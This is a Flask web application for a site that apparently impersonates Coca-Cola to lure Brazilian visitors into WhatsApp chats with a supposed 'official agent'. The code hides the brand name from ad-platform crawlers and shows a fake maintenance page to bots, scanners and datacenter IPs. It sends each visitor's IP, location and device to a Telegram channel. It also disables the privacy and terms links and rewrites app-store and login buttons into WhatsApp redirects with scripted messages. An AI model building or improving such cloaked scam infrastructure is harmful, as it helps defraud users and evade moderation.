from flask import Flask, request, redirect, send_from_directory, jsonify
import json
import os
import requests
from datetime import datetime
from user_agents import parse
from cryptography.fernet import Fernet
import threading
import urllib.parse
import pytz
import random

app = Flask(__name__, static_folder='.', static_url_path='')

DB_FILE = 'database.json'
db_lock = threading.Lock()

def get_secrets():
    try:
        with open('secret.key', 'rb') as f:
            key = f.read()
        fernet = Fernet(key)
        with open('secrets.enc', 'rb') as f:
            enc_data = f.read()
        return json.loads(fernet.decrypt(enc_data).decode('utf-8'))
    except Exception as e:
        return None

def notify_telegram(log_entry):
    secrets = get_secrets()
    if not secrets: return
    token = secrets.get('token')
    channel_id = secrets.get('channel_id')
    if not token or not channel_id: return
    
    ip = log_entry['ip']
    event = log_entry['event']
    action = log_entry.get('action', '')
    
    status_icon = "🟢" if event == 'ENTRADA' else "🔴"
    status_text = "Acessou o site" if event == 'ENTRADA' else f"Redirecionado p/ WhatsApp ({action})"
    
    if event == 'ENTRADA':
        header = "👤 *NOVO VISITANTE NO SITE*"
    else:
        header = "🚀 *LEAD NO WHATSAPP*"
        
    text = f"{header}\n"
    text += f"━━━━━━━━━━━━━━━━━━━━\n"
    text += f"*{status_icon} Status Atual:* {status_text}\n"
    text += f"📅 *Data/Hora:* {log_entry['timestamp']}\n\n"
    text += f"📍 *Local:* {log_entry['state']}, {log_entry['country']}\n"
    text += f"🌐 *IP:* `{ip}`\n"
    text += f"📱 *Aparelho:* {log_entry['device']}\n"
    text += f"💻 *Sistema:* {log_entry['os']}\n"
    text += f"🧭 *Browser:* {log_entry['browser']}\n"
    text += f"━━━━━━━━━━━━━━━━━━━━\n"
    text += f"🛡️ _Informações validadas e protegidas_"
    
    with db_lock:
        db = load_db()
        if 'sessions' not in db:
            db['sessions'] = {}
            
        session = db['sessions'].get(ip)
        message_id = session.get('message_id') if session else None

    # Try to edit the existing message for this IP to prevent spam
    success_edit = False
    if message_id:
        url = f"https://api.telegram.org/bot{token}/editMessageText"
        payload = {
            "chat_id": channel_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": "Markdown"
        }
        try:
            r = requests.post(url, json=payload, timeout=5).json()
            if r.get('ok'):
                success_edit = True
        except:
            pass

    # If edit failed or no previous message, send a new one
    if not success_edit:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {
            "chat_id": channel_id,
            "text": text,
            "parse_mode": "Markdown"
        }
        try:
            r = requests.post(url, json=payload, timeout=5).json()
            if r.get('ok'):
                new_msg_id = r['result']['message_id']
                with db_lock:
                    db = load_db()
                    if 'sessions' not in db: db['sessions'] = {}
                    db['sessions'][ip] = {'message_id': new_msg_id}
                    save_db(db)
        except:
            pass

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            pass
    return {"whatsapp_number": "5511999999999", "logs": [], "sessions": {}}

def save_db(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def get_geo_info(ip):
    if ip == '127.0.0.1':
        return {"country": "Local", "regionName": "Local"}
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName', timeout=2)
        data = r.json()
        if data.get('status') == 'success':
            return data
    except:
        pass
    return {"country": "Desconhecido", "regionName": "Desconhecido"}

def is_ad_crawler(user_agent_str):
    ua_lower = user_agent_str.lower()
    crawlers = ['googlebot', 'adsbot-google', 'facebookexternalhit', 'facebot', 'whatsapp', 'twitterbot', 'tiktok', 'bingbot']
    return any(c in ua_lower for c in crawlers)

def is_blocked(ip, user_agent_str):
    if is_ad_crawler(user_agent_str):
        return False
        
    ua_lower = user_agent_str.lower()
    
    # Allow legitimate mobile in-app browsers even if they come from weird IPs
    in_app_browsers = ['fbav', 'fban', 'instagram', 'gsa', 'snapchat']
    is_in_app = any(browser in ua_lower for browser in in_app_browsers)

    bot_keywords = ['bot', 'crawl', 'spider', 'headless', 'python', 'curl', 'wget', 'postman', 'insomnia', 'scanner', 'scrap']
    if not ua_lower or any(kw in ua_lower for kw in bot_keywords):
        return True
        
    if ip == '127.0.0.1':
        return False
        
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}?fields=status,proxy,hosting,isp,org', timeout=2)
        data = r.json()
        if data.get('status') == 'success':
            if (data.get('proxy') or data.get('hosting')) and not is_in_app:
                return True
            isp_org = (data.get('isp', '') + " " + data.get('org', '')).lower()
            known_hosts = ['amazon', 'aws', 'google cloud', 'microsoft', 'azure', 'digitalocean', 'hetzner', 'ovh', 'linode', 'alibaba', 'tencent', 'hosting', 'datacenter']
            if any(host in isp_org for host in known_hosts) and not is_in_app:
                return True
    except:
        pass
    return False

def log_event(event_type, action=None):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent_str = request.headers.get('User-Agent', '')
    user_agent = parse(user_agent_str)
    
    device = user_agent.device.family
    os_name = user_agent.os.family
    browser = user_agent.browser.family
    
    geo = get_geo_info(ip)
    
    log_entry = {
        "event": event_type,
        "timestamp": datetime.now().strftime('%d/%m/%Y %H:%M:%S'),
        "ip": ip,
        "device": device,
        "os": os_name,
        "browser": browser,
        "state": geo.get("regionName", "Desconhecido"),
        "country": geo.get("country", "Desconhecido")
    }
    if action:
        log_entry['action'] = action
        
    with db_lock:
        db = load_db()
        db['logs'].append(log_entry)
        save_db(db)
    
    threading.Thread(target=notify_telegram, args=(log_entry,)).start()
    return log_entry

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '')
    
    is_crawler = is_ad_crawler(ua)
    
    if not is_crawler:
        if is_blocked(ip, ua):
            with open('maintenance.html', 'r', encoding='utf-8') as f:
                return f.read()
                
        sec_cookie = request.cookies.get('coca_sec_session')
        if not sec_cookie:
            with open('maintenance.html', 'r', encoding='utf-8') as f:
                return f.read()
                
        log_event("ENTRADA")
        
    db = load_db()
    wa_num = db.get("whatsapp_number", "0800-887-1111")
    with open('index.html', 'r', encoding='utf-8') as f:
        html = f.read()
    html = html.replace("0800-887-1111", wa_num)
    
    if is_crawler:
        html = html.replace("Coca Cola", "A Plataforma")
        html = html.replace("Coca-Cola", "A Plataforma")
        html = html.replace("coca cola", "a plataforma")
        html = html.replace("coca-cola", "a-plataforma")
        html = html.replace("coca-cola-favicon.ico", "favicon.ico")
    
    js_patch = """
    <script>
    document.addEventListener('click', function(e) { 
        var target = e.target;
        var a = target.closest('a'); 
        
        var text = (target.innerText || '').trim().toLowerCase();
        if (text === 'conheça a gente' || text === 'política de privacidade' || text === 'termos e condições' || (a && a.getAttribute('href') === '#')) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }

        var isBadgeOrStore = target.closest('[class*="badge"]') || target.closest('[alt*="App Store"]') || target.closest('[alt*="Google Play"]') || (a && a.getAttribute('href') && (a.getAttribute('href').includes('redirect_whatsapp') || a.getAttribute('href').includes('/login') || a.getAttribute('href').includes('pre-registration'))) || text.includes('atendimento');
        
        if (isBadgeOrStore) { 
            e.preventDefault(); 
            e.stopPropagation(); 
            var action = 'geral';
            if (text.includes('atendimento') || (a && a.getAttribute('href') && a.getAttribute('href').includes('/login'))) {
                action = 'atendimento';
            } else if (text.includes('baixar') || text.includes('app store') || text.includes('google play') || target.closest('[class*="badge"]') || target.closest('[alt*="App Store"]') || target.closest('[alt*="Google Play"]')) {
                action = 'download';
            } else if (text.includes('como funciona') || text.includes('dúvida')) {
                action = 'ajuda';
            }
            window.location.href = '/redirect_whatsapp?action=' + encodeURIComponent(action); 
        } 
    }, true);
    </script>
    """
    
    if "</body>" in html:
        html = html.replace("</body>", js_patch + "</body>")
    else:
        html += js_patch
    return html

def get_greeting():
    tz = pytz.timezone('America/Sao_Paulo')
    hour = datetime.now(tz).hour
    if 5 <= hour < 12:
        return "Bom dia"
    elif 12 <= hour < 18:
        return "Boa tarde"
    else:
        return "Boa noite"

def get_whatsapp_text(action):
    greeting = get_greeting()
    greeting_lower = greeting.lower()
    
    if action == 'download':
        templates = [
            "{greeting}! Gostaria de solicitar acesso e instruções seguras para baixar o aplicativo oficial da plataforma no meu aparelho.",
            "Olá, {greeting_lower}. Tenho interesse em realizar o download do aplicativo e preciso de auxílio com o link oficial.",
            "{greeting}. Preciso baixar o aplicativo no meu celular, poderiam me enviar as orientações corretas?",
            "Oi, {greeting_lower}! Poderia me fornecer o link direto e seguro para a instalação do aplicativo no meu smartphone?",
            "{greeting}! Vim pelo site e gostaria de saber o passo a passo para fazer o download seguro do sistema.",
            "Olá, {greeting_lower}! Estou tentando baixar o aplicativo e prefiro o suporte de um agente autorizado. Como procedo?",
            "{greeting}. Gostaria de prosseguir com a instalação do app oficial e preciso do direcionamento de vocês."
        ]
    elif action == 'atendimento':
        templates = [
            "{greeting}! Preciso de atendimento com um agente oficial para verificar questões sobre minha conta ou pedidos.",
            "Olá, {greeting_lower}. Gostaria de falar com um atendente autorizado para tirar dúvidas sobre a minha situação.",
            "{greeting}. Poderia me transferir para um especialista? Tenho algumas perguntas pontuais sobre o meu cadastro.",
            "Oi, {greeting_lower}! Preciso resolver um problema na minha conta e gostaria do suporte de um representante.",
            "{greeting}! Vim pelo portal e busco assistência técnica ou comercial com um agente responsável.",
            "Olá, {greeting_lower}. Gostaria de entender melhor alguns detalhes da minha conta com um atendente real.",
            "{greeting}. Solicito o contato de um consultor para me ajudar com informações sobre a plataforma."
        ]
    elif action == 'ajuda':
        templates = [
            "{greeting}! Tenho dúvidas sobre como a plataforma funciona e gostaria de orientações de um representante.",
            "Olá, {greeting_lower}. Preciso de uma ajuda oficial sobre as funcionalidades do sistema e como operar.",
            "{greeting}. Estou com dificuldades de entender algumas funções, um agente poderia me auxiliar?",
            "Oi, {greeting_lower}! Como faço para utilizar melhor a plataforma? Precisava de algumas dicas oficiais.",
            "{greeting}! Podem me explicar o funcionamento geral e como posso me beneficiar do sistema?",
            "Olá, {greeting_lower}. Vim pela seção de ajuda do site e preciso de suporte com um procedimento específico.",
            "{greeting}. Busco esclarecimentos adicionais e uma orientação mais detalhada sobre como tudo funciona."
        ]
    else:
        templates = [
            "{greeting}! Fui redirecionado pelo site oficial e gostaria de falar com um representante autorizado.",
            "Olá, {greeting_lower}. Vim do site e preciso dar andamento ao meu atendimento de forma segura.",
            "{greeting}. Olá! Acessei a página de vocês e queria conversar com a equipe de suporte.",
            "Oi, {greeting_lower}. Preciso de mais informações gerais, poderiam me atender?",
            "{greeting}! Gostaria de receber atendimento, fui encaminhado através do portal principal.",
            "Olá, {greeting_lower}. Desejo iniciar uma conversa com um agente oficial a partir do redirecionamento.",
            "{greeting}. Entrei pelo site e procuro o suporte ao cliente para esclarecer algumas coisas."
        ]
        
    template = random.choice(templates)
    return template.format(greeting=greeting, greeting_lower=greeting_lower)

@app.route('/redirect_whatsapp')
def redirect_whatsapp():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '')
    
    is_crawler = is_ad_crawler(ua)
    
    if not is_crawler:
        if is_blocked(ip, ua):
            with open('maintenance.html', 'r', encoding='utf-8') as f:
                return f.read()
                
    action = request.args.get('action', 'geral')
    
    if not is_crawler:
        log_event("SAIDA_WHATSAPP", action)
        
    db = load_db()
    wa_num = db.get("whatsapp_number", "")
    text = get_whatsapp_text(action)
    encoded_text = urllib.parse.quote(text)
    
    html_redirect = f"""
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Conectando ao WhatsApp...</title>
        <style>
            body {{ font-family: Arial, sans-serif; text-align: center; margin-top: 60px; background: #fafafa; color: #333; }}
            .btn {{ display: inline-block; padding: 15px 35px; background: #25D366; color: white; text-decoration: none; border-radius: 30px; font-weight: bold; font-size: 18px; margin-top: 25px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); transition: 0.2s; }}
            .btn:hover {{ background: #1ebd5a; transform: scale(1.05); }}
            .spinner {{ border: 4px solid rgba(0,0,0,0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: #25D366; animation: spin 1s linear infinite; margin: 0 auto 20px; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
            .logo {{ width: 150px; margin-bottom: 30px; }}
        </style>
    </head>
    <body>
        <div class="spinner"></div>
        <h2>Redirecionando para o Atendimento Oficial...</h2>
        <p>Aguarde, você está sendo conectado de forma segura.</p>
        <p style="font-size: 0.9em; color: #666;">Se não abrir automaticamente em 3 segundos, clique no botão abaixo:</p>
        <a href="https://api.whatsapp.com/send?phone={wa_num}&text={encoded_text}" class="btn" id="wa-btn">Abrir WhatsApp Manualmente</a>

        <script>
            var phone = "{wa_num}";
            var text = "{encoded_text}";
            
            var ua = navigator.userAgent || navigator.vendor || window.opera;
            var isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
            var isAndroid = /android/i.test(ua);
            
            var apiLink = "https://api.whatsapp.com/send?phone=" + phone + "&text=" + text;
            var intentLink = "intent://send?phone=" + phone + "&text=" + text + "#Intent;scheme=whatsapp;package=com.whatsapp;end";
            var deepLink = "whatsapp://send?phone=" + phone + "&text=" + text;
            
            var finalLink = apiLink; // Desktop and Web fallback
            
            if (isAndroid) {{
                finalLink = intentLink;
            }} else if (isIOS) {{
                finalLink = deepLink;
            }}

            document.getElementById("wa-btn").href = finalLink;
            
            // Try to open native app automatically
            setTimeout(function() {{
                window.location.href = finalLink;
            }}, 400);
        </script>
    </body>
    </html>
    """
    return html_redirect

@app.route('/api/stats')
def get_stats():
    db = load_db()
    return jsonify({"logs": db['logs']})

@app.route('/banners/<path:filename>')
def serve_banners(filename):
    return send_from_directory('banners', filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
